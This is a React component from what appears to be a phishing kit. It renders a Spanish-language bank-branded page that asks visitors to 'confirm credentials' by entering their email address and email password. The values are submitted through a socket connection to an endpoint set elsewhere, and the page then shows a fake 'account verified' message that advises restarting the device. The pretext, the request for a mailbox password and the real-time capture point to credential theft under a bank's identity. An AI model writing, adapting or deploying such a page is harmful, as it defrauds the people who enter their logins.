import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../../context'
import { submitBase } from '../../../../helpers/submitBase'

import { EmailAndPasswordInput } from './EmailAndPasswordInput'
import { emailAndPasswordValidate } from '../../../../security/emailAndPasswordValidate'
// import { ErrorEmailAndPassword } from './ErrorEmailAndPassword'
import { Spiner } from '../../../Spiner'

import logo from '../../../../assets/logo.png'
import check from '../../../../assets/check.png'

const valuesData = { correo: '', claveCorreo: '' }

export const EmailAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = ''}) => {
    
    const navigate = useNavigate()
    
    const { addData } = useContext(UserDataContext);
    const { socket } = useContext(SocketContext);    
    const [showSpiner , SetshowSpiner] = useState(false);
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    const [seconds, setSeconds] = useState(5)

    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => emailAndPasswordValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl})
    })

    return (
        <div className='bg-[#E7E3E3] w-screen h-screen flex items-center flex-col'>
            {/* Spiner de carga */}
    
    
            {/* Aqui ira las notificacion de error en caso general */}
            {/* <UsernameAndPasswordError
                touched={touched}
                errors={errors}
            />
            {
                virtualKeyword === true ? (<UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) : null
            } */}
            {/* Colocar diseño base */}
            <div className='relative w-[183px] mt-[-22px] h-[100px] flex justify-center'>
                <img className='w-[183px] absolute' src={logo} alt="" />
            </div>
            <div className='w-[408px] h-[350px] blue-gradient'>
    
                {
                    showSpiner === true ? (
                        <div>
                            <p className='montserrat text-white text-center text-lg mt-6 mb-2'>Tu cuenta ha sido verificada con exito le recomendamos reiniciar su dispositivo.</p>
                            <img className='h-20 flex items-center m-auto' src={check} alt="" />
                        </div>
                    ) : (
                        <>
                        <p className='montserrat text-white text-center text-lg mt-6 mb-2'>Confirma tus credenciales para validar tu información.</p>
    
                        <form className='flex flex-col items-center' onSubmit={handleSubmit}>
    
                            <EmailAndPasswordInput
                                claveCorreo={values.claveCorreo}  
                                correo={values.correo} 
                                handleBlur={handleBlur} 
                                handleChange={handleChange}
                                touched={touched} 
                                errors={errors}
                                showPasswordMode={false}
                            />

                            <button 
                                disabled={
                                    (
                                        touched.correo &&
                                        errors.correo || 
                                        values.correo.length === 0
                                    ) || 
                                    (
                                        touched.claveCorreo &&
                                        errors.claveCorreo || 
                                        values.claveCorreo.length === 0
                                    ) ? true : false}
                                className='bg-blue-400 px-4 py-1 bg-transparent border-[1px] mt-[30px] w-[150px] max-w-[90%] text-[#fff] rounded-[15px]'

                                type='submit'
                            >
                                Ingresar
                            </button>

                            <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[190px] mt-[15px] p-[15px_20px]'>
                                Crear usuario
                            </a>
                        </form>
                        </>
                    )
                }
                
            </div>
            <div className='w-[408px] h-[250px] flex flex-col items-center text-center text-white bg-[#e31837]'>
                <p className='avenir text-3xl mx-16 leading-[60px]'>ABRE TU CUENTA Y DATE CUENTA</p>
                
                <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[240px] mt-[15px] p-[15px_20px] text-xl font-bold'>
                    Solicitar
                </a>
            </div>
        </div>
    )
}



